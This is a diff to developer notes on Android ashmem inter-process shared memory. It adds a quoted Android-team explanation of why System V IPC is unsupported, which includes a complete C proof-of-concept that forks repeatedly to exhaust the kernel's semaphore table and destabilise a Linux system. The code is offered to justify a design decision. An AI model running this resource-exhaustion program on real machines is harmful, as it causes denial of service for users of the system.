@@ -71,6 +71,7 @@ Problem: The read process is not getting the values of the writer
 	#include <errno.h>
 	#include <sys/mman.h>
 	#include "ashmem.h"
+	
 	int main(int argc, char **argv) {
 	    int shID = ashmem_create_region(SHM_NAME, 2);
 	    if (shID < 0)
@@ -102,6 +103,7 @@ Problem: The read process is not getting the values of the writer
 	#include <errno.h>
 	#include <sys/mman.h>
 	#include "ashmem.h"
+	
 	int main(int argc, char **argv) {
 	    int shID = ashmem_create_region(SHM_NAME, 2);
 	    if (shID < 0)
@@ -162,4 +164,103 @@ Your test programs create two distinct ashmem regions with the same name, that's
 2) Pass a new file descriptor to the region from the first process to the second one
 
 One way to do that is to fork the first process to create the second (this will automatically duplicate the file descriptors), but this is generally not a good idea under Android.
-A better alternative is to use sendmsg() and recvmsg() to send the file descriptor through a Unix-domain socket between the two processes. This is generally tricky, but as an example, have a look at the SendFd() and ReceiveFd() functions in the following source file was written for the NDK:
+A better alternative is to use sendmsg() and recvmsg() to send the file descriptor through a Unix-domain socket between the two processes. This is generally tricky, but as an example, have a look at the SendFd() and ReceiveFd() functions in the following source file was written for the NDK
+
+Android Team Explaining on System V IPC and ashmem:
+--------------------------------------------------
+Android does not support System V IPCs, i.e. the facilities provided by the
+following standard Posix headers:
+
+	<sys/sem.h>   /* SysV semaphores */
+	<sys/shm.h>   /* SysV shared memory segments */
+	<sys/msg.h>   /* SysV message queues */
+	<sys/ipc.h>   /* General IPC definitions */
+	#include <sys/sem.h>
+	#include <sys/wait.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <errno.h>
+	#define  NUM_SEMAPHORES  32
+	#define  MAX_FAILS       10
+
+The reason for this is due to the fact that, by design, they lead to global
+kernel resource leakage.
+For example, there is no way to automatically release a SysV semaphore
+allocated in the kernel when:
+- a buggy or malicious process exits
+- a non-buggy and non-malicious process crashes or is explicitely killed.
+Killing processes automatically to make room for new ones is an
+important part of Android's application lifecycle implementation. This means
+that, even assuming only non-buggy and non-malicious code, it is very likely
+that over time, the kernel global tables used to implement SysV IPCs will fill
+up.
+At that point, strange failures are likely to occur and prevent programs that
+use them to run properly until the next reboot of the system.
+And we can't ignore potential malicious applications. As a proof of concept
+here is a simple exploit that you can run on a standard Linux box today:
+
+	#include <sys/sem.h>
+	#include <sys/wait.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <errno.h>
+	#define  NUM_SEMAPHORES  32
+	#define  MAX_FAILS       10
+	
+	int  main(void)
+	{
+		int   counter = 0;
+		int   fails   = 0;
+		if (counter == IPC_PRIVATE)
+		  counter++;
+		printf( "%d (NUM_SEMAPHORES=%d)\n", counter, NUM_SEMAPHORES);
+		for (;;) {
+		  int  ret = fork();
+		  int  status;
+		  if (ret < 0) {
+			  perror("fork:");
+			  break;
+		  }
+		  if (ret == 0) {
+			  /* in the child */
+			  ret = semget( (key_t)counter, NUM_SEMAPHORES, IPC_CREAT );
+			  if (ret < 0) {
+				  return errno;
+			  }
+			  return 0;
+		  }
+		  else {
+			  /* in the parent */
+			  ret = wait(&status);
+			  if (ret < 0) {
+				  perror("waitpid:");
+				  break;
+			  }
+			  if (status != 0) {
+				  status = WEXITSTATUS(status);
+				  fprintf(stderr, "child %d FAIL at counter=%d: %d\n", ret,
+								  counter, status);
+				  if (++fails >= MAX_FAILS)
+					  break;
+			  }
+		  }
+		  counter++;
+		  if ((counter % 1000) == 0) {
+			  printf("%d\n", counter);
+		  }
+		  if (counter == IPC_PRIVATE)
+			  counter++;
+		}
+		return 0;
+	}
+
+If you run it on a typical Linux distribution today, you'll discover that it
+will quickly fill up the kernel's table of unique key_t values, and that
+strange things will happen in some parts of the system, but not all.
+(You can use the "ipcs -u" command to get a summary describing the kernel
+ tables and their allocations)
+For example, in our experience, anything program launched after that that
+calls strerror() will simply crash. The USB sub-system starts spoutting weird
+errors to the system console, etc...
